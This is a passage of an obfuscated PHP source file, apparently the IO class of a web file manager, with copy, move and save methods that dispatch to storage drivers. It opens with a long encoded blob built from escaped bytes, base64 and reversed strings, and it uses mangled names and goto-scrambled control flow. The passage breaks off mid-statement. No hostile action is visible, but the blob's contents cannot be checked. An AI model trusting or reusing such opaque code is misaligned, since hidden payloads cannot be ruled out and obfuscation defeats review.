327\155\256\303\14\105\351\245\242\217\300\64\63\161\265\215\271\4\263\167\107\265\130\201\163\62\251\163\37\162\350\110\335\131\20\340\24\14\71\61\135\20\174"."\xa\x82\x16\x92\x4a\x60\x83\xc9\x4a\x4e\xa0\x51\xa2\xc2\x2e\xfe\x39\xbb\x50\xff\x9d\x3a\xf7\xdf\x6\x66\x15\x7b\xfb\x9c\xab\xe4\xa8\x27\x34\xdb\x5a\xb0\x39\x4f\xeb\x6c\xea\x6c\xe9"."\xc\x8b\x3\x66\xea\x72\x77\x37\x68\xb6\xe0\x96\xc9\xd2\x96\x1f\x73\xef\x46\x4e\x8b\xce\x2c\xe8\xd0\x8d\x44\x22\x7e\xd8\xd\x52\x40\xef\x5\x3\x11\x86\xa7\xc8\xbf\x6f\x1\x4c\x3d"."\13\302\11\256\166\163\275\232\114\126\160\64\55\142\7\334\274\231\133\140\50\334\142\257\172\224\100\40\157\167\304\55\46\163\77\7\206\47\135\247\305\310\116\270\264"."\10\340\135\121\165\321\370\22\360\133\132\344\50\202\174\24\12\303\231\202\0\324\216\242\352\361\45\350\243\224\130\64\17\21\225\122\301\313\24\277\250\40\142\155\255"."\154\232\302\271\132\55\32\15\270\322\253\334\125\356\1\262\372\153\373\140\215\334\257\255\235\342\17\106\0\221\243\76\314\43\42\251\45\104\234\214\272\30\323\314\132".base64_decode('QolwS8NkSjM9LWc7ud+3mbWDqaREZKCa4kpXRbFE3SLXFLeHG53TimtnHTez')."\36\35\270\233\112\13\74\61\207\316\364\260\170\72\213\34\213\315\204\213\211\5\334\326\320\160\171\11\115\112\311\103\132\32\154\154\200\36\245\134\124\203\271\235\321".strrev('bztHgd…	Úl¹3Û÷hÉÏ'."\r".']hl1¬ƒA-â$˜ª­9nNš˜­/Šî,')."\163\366\131\141\115\17\305\134\153\172\221\20\106\71\211\110\361\117\354\234\265\132\22\75\366\12\216\316\234\220\3\300\53\217\236\255\20\30\244\221\24\244\212\156\343"."\x28\x5e\x43\x2\x18\xb1\x12\xc0\xd9\xb6\xf6\xc2\xa1\x76\x2\xae\xa\xe2\x3f\x58\x54\x60\xb3\x35\x95\x42\x49\xac\x6e\x61\xed\xce\x62\xed\xa3\x80\xb2\xc0\xc9\x75\x8a\x5e\x68\x7\x1".strrev('Ôh”T,¥›3Ñ*öcUÒJª	F¦ÁuÃ’âõ\'_œ\'K¡£'."\r".'Ÿ')."\11\37\53\317\302\217\3\161\335\311\130\160\73\113\57\234\137\346\373\203\4\213\127\252\232\130\75\171\172\65\125\100\76\223\336\77\145\63\146\15\373\244\376\42\317"."\160\167\123\72\300\175\310\322\276\301\11\267\170\307\24\300\174\30\331\12\247\4\304\222\216\267\326\342\201\230\164\24\213\227\202\117\120\164\320\212\127\22\274\220\215"."\60\347\252\5\50\151\114\351\247\273\45\331\54\205\47\20\330\204\304\351\207\316\322\313\174\211\164\45\173\171\117\272\240\212\33\301\360\136\320\120\215\63\125\150\133"."\x15\x4e\x35\xa3\x89\x6c\xba\xb7\x46\x88\x94\x4c\x4d\x93\x52\x72\x3a\x47\xd8\xfd\x9\x46\xf5\x4\x63\x6\xac\xa8\x66\x82\x6b\x52\xb7\x1\x2\x84\x5e\x33\x8f\x59\x70\x1f\xe1\xee\x6e"."\260\241\74\211\301\307\312\56\350\271\330\5\67\251\140\126\360\305\156\125\367\214\200\275\311\366\302\204\370\264\103\133\62\313\334\334\146\320\67\351\122\233\277\275\311"."\327\52\134\72\13\200\110\175\103\153\304\323\326\126\60\202\361\63\360\4\14\336\317\270\172\250\47\367\50\105\303\231\152\52\56\105\241\116\147\115\21\204\26\111\206"."\36\245\216\306\212\334\204\360\242\4\134\242\232\251\222\54\305\60\213\324\15\372\344\104\137\70\272\170\326\114\267\72\213\315\16\167\32\240\153\134\65\325\345\36\7".base64_decode('5Ss3vM9NnwnRQbxTQtBG7iJAkmbKEh74mmJ42dZdLCXABs40VmbZM7fSi42Z').base64_decode('blmMhEsxqFHumMlY/eyEueDRuSdqc1NbL6fn5WeBhbuihaLc6GzAzSVH6qZE').base64_decode('VC+0ePCx3iuwo/gCCOJijuEzcrQXoiPfO3BCF4log9IMjrD4WzWFGzTQBVAp')."\x94\x66\x75\xee\x38\x7a\xe9\x52\x5c\x10\x64\x17\x96\x2f\xcf\x87\x11\x1d\x1c\x7b\x94\x27\xa3\xda\x41\x10\x8b\xec\x30\x28\x90\x73\x18\xd8\x4\xad\xd5\x60\xc\x16\x13\x71\x8\x4d\xe3"."\x6f\x6d\xe2\x19\xf0\xb2\xe2\x61\x10\xb9\x90\xaa\xb7\xa1\x50\xe7\xc2\x62\x57\xd9\xf2\xe5\x6e\x95\x5e\x5a\x77\x16\x59\xf3\xba\x58\x6a\x1c\xee\x74\x59\xd3\x83\x96\x93\xa1\x66\x9\x9".strrev('ßYö|ğÎ‡ºtiÊÕåh‹—d-fjk¬o´åÙŞUÆ]Î;ÂÈs›3À')."\312\171\142\206\340\230\226\270\320\341\211\307\352\144\255\266\237\371\65\26\365\145\361\267\47\223\21\203\324\257\67\72\74\117\252\135\156\266\322\361\201\272\53\312\365"."\xc5\x69\x12\x44\x67\x6c\x70\x78\xb3\x6c\x8b\x80\x6f\xe9\x20\x70\x3f\xa0\x9c\x80\x45\xeb\xb1\xc3\x41\x59\xc\xc8\x3e\x66\x1a\x51\x5d\xcd\x98\x16\x1a\x85\xdf\x2d\x29\x42\x9e\xa8\x7b"."\xe4\x7e\x19\x27\x29\x92\xe8\x83\x8\x45\xc8\xfd\x66\x11\xa0\x49\x38\x86\x10\x3\xde\x94\x99\x90\xf8\x48\xba\x92\xac\x29\x42\xcd\x35\x12\x8a\x2\xf2\x23\xf2\x52\xa8\x12\x90\xb1\x48"."\242\224\61\45\263\21\323\115\15\354\222\114\115\232\70\177\157\17\22\305\124\117\53\271\242\40\374\327\270\305\370\167\374\70\266\27\300\327\6\222\212\216\265\357\20"."\305\101\327\123\335\374\204\213\370\242\157\13\6\302\201\172\352\325\273\320\121\330\44\312\354\32\130\5\237\13\105\124\63\172\256\267\303\232\202\261\17\156\2\41\323"."\257\147\323\151\166\377\17\371\111\266\307\341\53\237\120\42\153\362\335\21\172\347\14\103\173\30\203\200\5\347\75\320\165\220\22\243\247\33\12\163\43\105\340\5\162".base64_decode('4DsYWB5dDpaTDVxTUqPei6oqKiqcFZXgf3YFSaqorqjIS1JRUY3+xxHokJYM')."\xa8\x35\x6\xac\x5f\x4a\x68\x48\x82\x1\x45\x21\xd\x22\x64\x3e\xa5\xa6\xb3\x94\x7d\xaa\x87\xba\xea\x12\x6c\x59\x4d\x4d\xd\x65\x19\x68\x7\xc0\x60\x22\x73\x9e\x6a\x4a\x5\x66\x8".base64_decode('Yt8MCV19kZBiHwZ2p0jmh+4UcNnTb8DHgLlCw0KHmWo6gGQcC0A7vOkYEVBm')."\x60\x5b\x90\x1a\xb1\x32\x17\x1d\x5e\x11\x28\xde\x44\x59\x6a\x5\xe9\xc0\x66\x19\x65\xd\x86\x0\xe1\x28\x3\x59\x31\x31\x65\x7f\x14\x4a\x32\xdb\x33\x18\x6c\x65\x49\xb1\x6f\x5f\xfc"."\x62\x16\xe9\x6d\x1\x44\x4a\x68\x3\x11\xbe\xc9\xc1\xe0\x1c\x16\x42\x9d\x87\x82\xc\x45\x19\xd6\x4d\x32\x2\x94\xfc\x51\x14\xa1\xb7\xd4\xe4\xd2\x1b\x59\x73\xf5\xaa\x49\x8b\xa9\x4f"."\104\50\133\164\114\13\250\14\144\167\351\374\341\143\167\122\1\144\174\134\174\352\221\347\76\364\44\12\326\203\251\76\116\30\74\135\343\306\67\171\357\7\321\220\140"."\10\106\117\233\103\377\105\321\202\102\274\24\200\125\23\352\231\313\42\241\0\173\224\55\217\47\46\74\155\143\160\137\105\365\314\55\231\350\300\10\137\360\12\27\376".strrev('áì¬¯¢&Ô Dé‰±”üòYƒ'."\n".'ÛÀö!¹ZèÊáH‚ıitoÉ›ñ')."\xc6\x3e\x32\x7f\xff\x49\x48\xca\x5f\x91\x13\x80\x56\x7d\x1f\x21\xa2\x9e\xf9\xfd\x16\x81\x50\x44\x11\xef\xf0\x91\x3d\xa0\xb5\xc\x28\x4a\x58\x21\xac\x65\x3f\x82\x2b\x54\x66\x35\xc9"."\x8b\x3c\x82\xa1\x16\x49\xc6\xd5\x9b\xe0\x79\x82\x78\xc6\xa9\x6a\x54\x3d\x0\x8e\x6\xbf\xb7\xb3\xc2\xf3\xb0\x8c\x2c\x5\x4a\xf9\xf0\x5a\xb1\xc6\xed\xb9\xf8\x4a\xfa\x71\x35\x4d\x5"."\73\317\216\256\304\23\134\330\361\210\50\226\303\345\322\314\136\217\51\200\56\126\224\310\233\173\164\276\13\13\250\146\364\101\10\1\21\203\162\42\61\332\336\276\254"."\102\271\47\201\230\110\46\47\45\260\115\120\171\66\241\153\246\51\232\162\172\250\342\22\14\370\305\275\63\214\263\70\147\361\172\54\27\76\202\77\100\226\24\20\155"."\132\273\114\251\65\322\253\161\41\167\245\234\271\267\5\355\272\67\210\72\233\224\376\122\107\212\151\346\357\35\116\147\110\120\217\50\120\3\311\304\262\220\115\103\127"."\242\100\232\201\204\117\60\21\114\233\101\45\56\6\375\32\223\164\341\5\203\122\240\10\150\30\54\40\47\304\2\40\203\145\105\243\143\301\17\43\10\11\316\63\205"."\235\334\131\51\61\26\40\202\113\306\201\162\41\2\245\57\304\15\330\16\150\4\155\107\44\142\206\262\135\354\54\334\266\103\123\135\112\111\334\45\251\106\44\54\0"."\31\315\302\36\30\142\34\50\26\172\176\343\75\23\263\240\72\363\262\340\70\270\263\161\325\111\61\306\0\162\11\34\252\341\143\12\124\205\242\204\21\215\322\215\227"."\xdc\xb8\x75\xf0\x41\x22\x11\x39\x85\xaa\x57\x39\x2b\xab\x9c\x13\xc9\x31\xac\xa8\x55\x49\xb6\x46\x32\xbe\x90\x8f\x14\xd0\x0\x72\xbb\x94\x82\x11\xd\x2a\x92\x8e\xa7\xd1\x84\xc7\x64".base64_decode('kMEqtx5EFrhsPpGpLgvpwo6jMO0qZPYqkhV+64uVrmCC9kLxeIRgdINF+8yW')."\0\254\14\153\74\161\250\231\262\274\12\10\360\300\242\345\140\53\204\270\122\25\235\206\242\134\274\37\134\221\17\200\64\354\266\123\30\30\176\173\215\355\174\251\6"."\42\243\113\34\34\326\30\60\377\6\334\305\64\60\211\235\11\171\274\245\244\24\332\231\130\316\22\132\162\314\136\0\314\144\57\334\37\231\162\234\41\6\150\54\103".base64_decode('TsMSwJolltwMxFINKMRkhMnAbc1tbgaqo8PELD+JAMWfAyEqVsRmYwCMuzZA').base64_decode('Flh9NVO2oa8MDqTUqOQPNPnqPf4GX2iuFFdM4YlMpDRtXe7oSAhPDsX8LuYn')."\x16\x7e\x3a\xbb\x0\x5b\xe8\x8c\x31\x76\xd8\xe0\x8c\xaf\xa0\x83\x23\x38\x4d\xb7\x16\x8b\x71\x54\xd1\xf3\x4a\x4\x6c\x74\xca\x4a\x10\x50\x1e\x78\xd0\x55\x20\x75\x92\x9f\xf5\x8\x89".base64_decode('M7qSnz6noKcCeYuFDNkCrSHpC9cAlog1NdislfRwjVfT/aqhcuJAc+TE0vlR')."\x9e\xce\xbc\x1b\xb\x83\x1e\x13\x1d\x18\xf3\xc1\xc6\xb5\x88\x66\xf8\x76\xd9\x53\x4c\x21\xaa\x56\xe2\x69\x12\x3d\x70\x64\xe8\x49\x36\x79\x5\x83\xbb\x96\x46\x41\xc1\xe9\x77\x46\x97"."\x55\x43\x11\x0\xd8\xfb\x74\x59\x29\xd\x9\xde\x3a\x48\xee\x8\xce\x83\x61\x41\xf8\x74\xde\xff\xba\x70\x35\xc6\x3d\x6f\xd8\x9a\xa6\xc6\xe8\xfd\x37\xd3\x8c\xc7\x2e\x5e\xeb\xc5\x87"."\x3c\x68\x13\xf2\x3c\x93\xff\x57\x1f\xe7\xe\x7e\x16\x1e\x41\xe6\xe6\x54\x5f\x11\xbd\x1f\x4a\x6e\x26\xd8\xad\x6f\x4\x3f\x9b\x8c\x83\x6e\xbb\x4e\x23\xf2\xaa\x9a\x8e\xea\xb9\x8c\x78".base64_decode('neKO0TdkqOQGHYl46dEoDAgvcGixaFLLxnhmUhlsDRZggDgFbxkoo+ui5M+U')."\xc8\xac\x58\x2e\x17\x6d\xce\xdc\xed\x2a\x76\x96\xe7\xf4\xf2\xea\x80\xfa\x4d\xc3\x97\x3\xf2\x49\x5c\x8a\x67\x9\xa4\x1a\xa9\x2\x9d\x14\x71\x65\x2a\x69\x26\xb5\xe1\xe1\x55\x20\x67".base64_decode('Ct5UxrTIaETVFoMQL8LlGKiaoaVyeQCLgO+nzWA6XdB5cLpbE3uNyCHYVfBT')."\22\120\265\31\177\141\41\320\1\330\162\305\314\167\140\216\313\31\266\120\303\276\241\160\346\6\220\210\120\102\33\260\76\65\1\41\2\53\143\41\321\326\272\140\214"."\x80\xda\xc8\x70\x53\x30\x83\xa1\xbf\xf0\xbc\xde\xe2\x39\x5e\x28\x7d\x2\xfe\xe9\x24\xbf\x94\xe6\xdb\x8b\xc6\xab\x9c\x34\xa5\x94\x4d\x75\xbd\xe5\x35\x5f\x1\xd0\xa2\x70\xb9\xc\xe5"."\x82\xf7\xe4\x72\x9a\x11\x31\xe2\xba\x9d\x3d\x29\xc1\x17\x1b\x8d\x13\x30\x8\x3d\x5e\xd0\x30\x4c\x56\x1b\x58\xb2\xfa\x92\xe6\x2e\xba\xf9\x7e\x64\x75\xab\xcc\x6e\xc6\x98\xd6\x14\xd2"."\136\23\235\144\207\265\260\34\167\140\116\10\322\43\36\252\313\211\337\242\366\40\352\64\210\244\47\44\61\206\1\263\204\4\364\365\207\230\3\75\115\200\251\222\375".base64_decode('+QthuTBSJ+aOJ7UuORnE6jYWrXYdSDFMmc6SjBAqOZMZ9jCecCf4YD6b9mG7')."\50\13\124\27\244\44\121\177\23\137\101\160\223\20\222\34\324\326\206\357\34\110\267\305\42\351\275\17\372\201\162\124\243\360\224\234\73\377\236\10\252\3\121\146\107"."\320\233\43\327\167\56\121\214\41\11\244\231\22\237\140\313\2\205\10\1\127\75\372\100\253\136\144\173\177\4\312\360\320\372\100\12\106\130\364\323\240\164\63\31\0".strrev('şì~{MÁÂ1yÙø#·°p“ßƒò?Œ÷„Âö´£ûeËò†(„¹†')."\x42\x94\xf5\x59\x29\xd8\x66\xa6\x68\x96\xc7\x8c\xdb\xf9\x70\x36\x54\xb6\xc\x41\xfb\xc0\x85\xb5\xfc\x73\x35\x7e\x3b\x96\xce\xa6\xf8\x85\x24\x8\x58\xe5\x92\xbc\xe\xb\x3d\xcc\xea"."\111\7\272\33\164\120\77\50\266\341\340\275\22\147\246\300\30\376\367\62\260\276\41\22\66\142\126\252\123\75\263\113\247\367\55\366\144\252\5\353\200\210\317\265\340"."\xb1\x3\xa6\x3c\x47\xf5\x1d\xa9\x58\xd5\xc4\xc9\xd3\x45\xa1\x9e\xcf\xf\xbf\xc7\x20\x1e\xd6\xa8\xa7\x3d\xfc\x43\x36\x70\x3e\xf1\x92\x15\xad\x24\xea\xfc\x49\x5c\xbe\x28\xd2\xaa\x11"."\x9a\xff\xc2\x8b\x80\xa2\x56\x92\xfc\xbf\x5b\xa\x9c\x45\xc6\x49\x5\x4d\xcd\xfc\xe7\xab\xf2\x86\x4\x61\xa5\xa0\xd5\x20\x6c\x68\xb6\x5b\x68\xd\x5e\xe\x1b\xbc\xb1\x78\xb\xe3\x2f"."\xbc\x58\xeb\xc2\xef\x11\x15\xe8\x87\xb0\x11\xf1\xa5\x81\x1f\xf\xd1\x92\x50\xd8\x4c\xc1\xa3\x4e\x53\x97\xad\x52\x53\x21\xe1\x0\x8d\x4\x95\x44\x54\xf4\xfe\x99\x62\x6f\x3b\x1a\x18"."\162\254\300\243\5\351\101\54\321\324\354\147\42\60\73\334\250\320\221\134\40\235\44\333\56\264\141\344\213\354\377\156\2\251\200\200\145\14\256\217\120\240\347\356\331"."\x94\x90\xd8\x1e\x5f\xb1\xbd\x9e\xf5\x23\xed\xc6\x4c\x17\x13\x86\x9c\x32\x7d\xd0\x5\x4d\xaa\x70\x8e\xa6\x98\x1\x34\xc1\x84\x7b\xe1\xb2\x99\xb5\xaf\xb6\xe2\x41\x36\x5e\xc6\x22\x87".base64_decode('NFyifC5MeGyGO3UQWC6Ym5pPDSPaUmrFH9BAFjH8aBqtVcu6FZyriQYmqCBx')."\x19\xe4\x17\x8d\x4e\x4b\x48\x7b\xc9\xc2\x45\xf\x91\x23\xc5\xd\x4f\x13\x33\x23\x92\x5\x75\x11\x38\x74\xc2\x3\x4a\x9a\xf8\x6d\xb5\xc8\xd\x50\x37\x59\x80\x49\xb2\x88\x5d\x20\xdc"."\140\173\143\13\21\37\373\303\133\264\377\150\235\163\232\46\330\243\131\270\177\366\322\204\105\32\60\354\117\256\0\166\112\364\51\7\202\14\303\311\346\111\250\36\122"."\335\305\265\71\354\317\256\145\4\343\133\333\333\214\302\301\245\365\325\305\204\330\54\350\176\300\266\254\251\101\40\264\257\304\267\51\204\360\43\47\144\370\233\162\342"."\377\317\317\260\375\377\174\175\215\151\217\67\21\266\226\362\140\103\202\153\114\174\250\151\153\275\165\143\74\126\214\45\170\351\260\204\110\200\57\63\270\343\270\154\317"."\116\272\230\6\43\165\122\101\175\127\310\364\322\104\206\117\315\344\35\122\322\47\232\0\36\366\262\27\204\12\5\362\337\317\263\240\34\345\62\171\63\323\152\264\267".strrev('‰Mš.ş„¥aŠ†@³£EJHp¡E~›‡-Ô°	Tã%äÀŸÕ¿x%À')."\6\262\134\45\264\103\244\27\26\120\36\225\11\133\366\76\13\120\34\36\376\116\244\313\372\354\41\311\321\142\173\40\7\47\262\270\152\264\234\50\347\337\311\346\347".base64_decode('ZktYzAI1Oq3nMuytvQr743uVzvzKsEI1PEUIQjmfIiS6dECXggXy4MUY4mmG').strrev('y'."\r".'T³oÄPïÙQyoÃÂpúe”+0†ºmÂ]/ìKà¿ˆ(”½KÂÿA').base64_decode('1STdDrW3lCCbAIKpgKcXHlg1Uxl84kUajY1uLOdLhugo12qbIyi7WiOgdrJ1')."\245\314\52\224\54\252\351\206\220\214\301\13\245\205\357\175\231\226\321\344\256\116\355\56\116\221\0\214\145\132\213\150\113\256\16\105\220\160\263\6\230\332\230\125\53".base64_decode('EkUiMHX1RF/d5XdD1qs55m8yj1JlVb8QjXJRZyHgF5og+bhdNorGJ9qeftmk').base64_decode('F1z2XO0WCUK4yIsi3PHm39XwKyRhy6fZoAjCaa0NLhB/Tu3kfn49w3neWIw9')."\xe1\x68\x49\xca\x9e\x70\x67\x50\x0\xe1\xaf\x3d\x42\xe\x47\xb0\x6a\xe4\xda\xb0\xca\x80\xfd\x55\x31\x97\x68\x9\x69\x49\x98\xf\xe5\x56\x8f\xf6\x7e\xa1\xb5\xc0\xe0\xe4\x96\x2c\x2d".strrev('Ğ2Q6 Zw¦Ò'."\r".' 62Y3ZUæ,L¸(êæïÔ‚i–Îì ál¨')."\375\331\26\145\210\317\116\132\57\336\104\71\135\230\133\45\351\27\212\23\57\345\206\315\20\52\134\11\107\67\353\20\13\206\254\74\202\356\102\232\145\360\5\52\306".strrev('ù‘ùˆ!4f¨aÎï`Ì^µ±^Ÿœ.z.˜çB˜—x¸‹SìsKHÅRF:')."\x70\x3d\x6f\x50\x49\x45\x85\xdb\x6b\x6f\x15\x1d\x53\xbb\xc0\xc5\xb\xc9\x6b\x8f\x70\xb3\x1f\xd6\xa\xe4\xc1\x2d\x2a\x98\xd\x47\xa1\xc7\x91\x19\x73\x68\xc9\x3b\xcc\x10\xc0\xbc\x38".base64_decode('CubNi6aZhZMKIZ8pZ41hupc/eERojxXosE20xUmHG8+CifOrIxhnT42k/MKt')."\340\302\271\355\366\264\120\53\12\46\36\266\25\5\36\174\45\16\261\12\20\121\32\123\200\154\362\253\366\174\2\315\343\12\134\374\343\62\341\346\53\172\145\51\20".base64_decode('LWoRFNYzCBZc+oZVAcAGFweG6w8RjaLeNLXCANm5ThZUuWQvgbLyKOtlU2Cl')."\270\227\316\12\272\224\5\65\140\35\350\235\350\74\311\63\51\323\223\155\101\171\30\313\33\232\251\106\5\55\43\373\313\330\70\236\126\222\24\16\314\154\147\125\134"."\72\267\334\56\27\70\315\101\40\302\150\361\103\142\213\126\65\336\271\311\351\70\276\44\253\207\67\246\354\142\4\12\106\16\274\41\342\150\370\124\267\3\306\205\265".strrev('Q8)TPu×$úè†øG˜:"ü_'."\0".'0ĞCš»ƒ=ˆ”£¯ '."\n".'’“LÓ­ú')."\23\113\0\36\370\263\200\270\151\221\73\266\306\254\355\242\220\3\200\370\327\245\15\122\157\146\320\264\223\267\207\77\40\52\333\131\60\176\317\117\360\115\324\227\100"."\6\264\206\33\307\270\211\113\130\47\52\303\111\134\211\364\144\342\226\354\330\13\75\323\23\374\261\22\310\131\42\57\2\273\212\104\307\100\320\151\252\167\201\57\24".strrev('kå¸F´ªª/?Ÿ-¼âáÖÍmQy)ª	r™,ö`ù¡ByµEå').base64_decode('Q630+P2B+cO1wlc/l7cEXYXyw+pMQqMnz/RMPyQnCU6JRl5KintC4nmswr04')."\xaf\x6\x75\x9\xc6\x3e\xac\xfe\xd7\x6d\x5a\x63\x14\x61\x49\x41\x50\xcd\xa4\x95\x94\x1d\xcc\x10\x28\xf4\xb4\xc9\x16\x37\x63\x73\x51\x87\x34\x9b\x36\x3b\xbe\xec\x75\x59\x6e\x88\x5".base64_decode('OFoswlP0WA4Qtk8EKCs4YuJ5Z/75O4rlIwJbOkcjik09Wpdwvo6lDmJtRcZY')."\320\55\302\337\44\372\377\0\32\131\270\22\120\233\0\0"."", 10, -8))); goto c»Ü†Š’÷…; cÖÇšØôŞ: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($bÒÈ²Šˆï¶, $FÏÈæóëç) { goto c¼ĞÓÕ•Ì; b»Ùó†š³: Hook::trigger($D‰Œ†ê…è³[1020] . $bÒÈ²Šˆï¶ . $D‰Œ†ê…è³[1021], $B–òÖöÇ¦İ); $D»²¼‡²§¶ = self::driverMake($FÏÈæóëç[0]); if (method_exists($D»²¼‡²§¶, $bÒÈ²Šˆï¶)) { $CÈµ‚äÉ¨ó = @call_user_func_array(array($D»²¼‡²§¶, $bÒÈ²Šˆï¶), $FÏÈæóëç); } else { if (method_exists($D»²¼‡²§¶, $D‰Œ†ê…è³[1022])) { $CÈµ‚äÉ¨ó = @call_user_func_array(array($D»²¼‡²§¶, $bÒÈ²Šˆï¶), $FÏÈæóëç); } else { if (method_exists(self, $bÒÈ²Šˆï¶)) { $CÈµ‚äÉ¨ó = @call_user_func_array(array(self, $bÒÈ²Šˆï¶), $FÏÈæóëç); } else { $CÈµ‚äÉ¨ó = call_user_func_array(array(parent, $bÒÈ²Šˆï¶), $FÏÈæóëç); } } } goto E·Ôí¢¬â ; c¼ĞÓÕ•Ì: $D‰Œ†ê…è³ =& $_SERVER[¾÷]; $B–òÖöÇ¦İ = $FÏÈæóëç; $GLOBALS[$D‰Œ†ê…è³[1019]] = $D‰Œ†ê…è³[1020] . $bÒÈ²Šˆï¶; goto b»Ùó†š³; E·Ôí¢¬â : Hook::trigger($D‰Œ†ê…è³[1020] . $bÒÈ²Šˆï¶ . $D‰Œ†ê…è³[1023], $B–òÖöÇ¦İ, $CÈµ‚äÉ¨ó); return $CÈµ‚äÉ¨ó; goto F—¿‰ßÅ¤; F—¿‰ßÅ¤: } public static function init($B‡³ÑÏÎõ) { return self::driverMake($B‡³ÑÏÎõ); } public static function copy($ašµø©Õ•¨, $E® æöÄî, $F•™ùÕ¥Ì = false, $dÏµ¶éã¯Ú = false) { return self::copyMoveStart($ašµø©Õ•¨, $E® æöÄî, $F•™ùÕ¥Ì, $_SERVER[¾÷][522], $dÏµ¶éã¯Ú); } public static function move($c´×ë«Š¦, $A„Î×ë£á, $A”—®Óï = false, $bö®¢âƒŞ¨ = false) { return self::copyMoveStart($c´×ë«Š¦, $A„Î×ë£á, $A”—®Óï, $_SERVER[¾÷][524], $bö®¢âƒŞ¨); } private static function copyMoveStart($BÙ×‘™‚¤ò, $eÚØÙÊ², $eëÊß“¥•, $B›ßõ»á¥“, $Côó„†É©) { $bğÅ«ÓåØÈ =& $_SERVER[¾÷]; $C’šê¯‰Ùˆ = array($BÙ×‘™‚¤ò, $eÚØÙÊ², $eëÊß“¥•, $Côó„†É©); Hook::trigger($bğÅ«ÓåØÈ[1020] . $B›ßõ»á¥“ . $bğÅ«ÓåØÈ[1021], $C’šê¯‰Ùˆ); $AªÌÇ±¶ìŠ = self::copyMove($BÙ×‘™‚¤ò, $eÚØÙÊ², $eëÊß“¥•, $B›ßõ»á¥“, $Côó„†É©); Hook::trigger($bğÅ«ÓåØÈ[1020] . $B›ßõ»á¥“ . $bğÅ«ÓåØÈ[1023], $C’šê¯‰Ùˆ, $AªÌÇ±¶ìŠ); return $AªÌÇ±¶ìŠ; } public static function saveFile($c¯„ù„¾â®, $DË“‰†İå, $A¸ë´‘“— = true) { goto aĞ“òĞ†Š; D”–ÚÆÕ“: $fÙˆõ„‘³É = $b’„¯Ûˆ•->pathFather($DË“‰†İå); $Fï¨¡‡’ˆ = !0; if (!$A¸ë´‘“— && self::driverIsSame($C†É“Öª‚, $b’„¯Ûˆ•)) { $Fï¨¡‡’ˆ = !1; } goto bÆµÂØÅ¾; aĞ“òĞ†Š: $c÷ÂÔ„·Ö =& $_SERVER[¾÷]; $E¨‹Ô‘Âˆ„ = self::info($DË“‰†İå); $C†É“Öª‚ = self::driverMake($c¯„ù„¾â®); goto AƒÓ„ë»›®; bÆµÂØÅ¾: $c•‰Ì¼Ï±‡ = self::copyFile($C†É“Öª‚, $c¯„ù„¾â®, $b’„¯Ûˆ•, $fÙˆõ„‘³É, $E¨‹Ô‘Âˆ„[$c÷ÂÔ„·Ö[38]], $Fï¨¡‡’ˆ); if ($bùà–¡—áÇ) { $c•‰Ì¼Ï±‡ = $bùà–¡—áÇ->getPathOuter($c•‰Ì¼Ï±‡); } return $c•‰Ì¼Ï±‡; goto BÅØÕ‘¦„¾; AƒÓ„ë»›®: $b’„¯Ûˆ• = self::driverMake($DË“‰†İå); $bùà–¡—áÇ = !1; if ($b’„¯Ûˆ•->pathParse[$c÷ÂÔ„·Ö[1024]]) { $Aã–ğÉ§Óå = $b’„¯Ûˆ•->pathParse[$c÷ÂÔ„·Ö[1024]]; $bùà–¡—áÇ = $b’„¯Ûˆ•; $b’„¯Ûˆ• = self::driverMake($Aã–ğÉ§Óå); } goto D”–ÚÆÕ“; BÅØÕ‘¦„¾: } private static function copyMove($cç®íó’, $b¬÷×öÑ‰«, $D²Â«Ş¡†Ÿ, $AçèòˆÛ”, $FÙ¦¦®„¦Ü = false) { goto Dæ…·÷‚ ø; D¯ÓƒêÌ†¶: $aªÈÃƒµ¡¤ = self::driverMake($cç®íó’); $D÷†§›†… = self::driverMake($b¬÷×öÑ‰«); $FÖööÃ…´„ = $AçèòˆÛ” == $b¡Ò¬¿­º[524]; goto bÈ–šÆˆŒ‹; bÈ–šÆˆŒ‹: $F¸òÓŒÇç = !1; if ($D÷†§›†…->pathParse[$b¡Ò¬¿­º[1024]]) { $b¬÷×öÑ‰« = $D÷†§›†…->pathParse[$b¡Ò¬¿­º[1024]]; $F¸òÓŒÇç = $D÷†§›†…; $D÷†§›†… = self::driverMake($b¬÷×öÑ‰«); } self::check($aªÈÃƒµ¡¤, $cç®íó’, $D÷†§›†…, $b¬÷×öÑ‰«); goto F½á×ÍŠÊâ; d‡ÑÌÒò…: if ($F¸òÓŒÇç) { $A•…Ü¡Ê½™ = $F¸òÓŒÇç->getPathOuter($A•…Ü¡Ê½™); } return $A•…Ü¡Ê½™; goto c«™¬‚¾Ã¡; A¯Êè˜ª®: $bšÀ•ø÷ÈÅ = $aªÈÃƒµ¡¤->isFile($cç®íó’); if (!$bšÀ•ø÷ÈÅ && $D÷†§›†…->getType() == $b¡Ò¬¿­º[716] && $aªÈÃƒµ¡¤->getType() == $b¡Ò¬¿­º[115]) { $A•…Ü¡Ê½™ = $D÷†§›†…->copyFolderFromIO($aªÈÃƒµ¡¤, $cç®íó’, $b¬÷×öÑ‰«, $D²Â«Ş¡†Ÿ, $FÖööÃ…´„, $FÙ¦¦®„¦Ü); } else { $A•…Ü¡Ê½™ = self::copyPath($aªÈÃƒµ¡¤, $cç®íó’, $D÷†§›†…, $b¬÷×öÑ‰«, $D²Â«Ş¡†Ÿ, $FÖööÃ…´„, $bšÀ•ø÷ÈÅ, $FÙ¦¦®„¦Ü); } if ($A•…Ü¡Ê½™ && $FÖööÃ…´„) { $aªÈÃƒµ¡¤->remove($cç®íó’); } goto d‡ÑÌÒò…; F½á×ÍŠÊâ: Hook::trigger($b¡Ò¬¿­º[82], $aªÈÃƒµ¡¤, $cç®íó’, $D÷†§›†…, $b¬÷×öÑ‰«); $A¢Íà£„×Ş = self::driverIsSame($aªÈÃƒµ¡¤, $D÷†§›†…); if ($A¢Íà£„×Ş) { if ($AçèòˆÛ” == $b¡Ò¬¿­º[524] && !method_exists($D÷†§›†…, $b¡Ò¬¿­º[1025]) && trim($b¬÷×öÑ‰«, $b¡Ò¬¿­º[18]) == trim($D÷†§›†…->pathFather($cç®íó’), $b¡Ò¬¿­º[18])) { if ($aªÈÃƒµ¡¤->pathThis($cç®íó’) != $FÙ¦¦®„¦Ü && !$aªÈÃƒµ¡¤->isTypeObject()) { return $aªÈÃƒµ¡¤->rename($cç®íó’, $FÙ¦¦®„¦Ü); } return $D÷†§›†…->getPathOuter($cç®íó’); } if (method_exists($D÷†§›†…, $AçèòˆÛ”)) { return 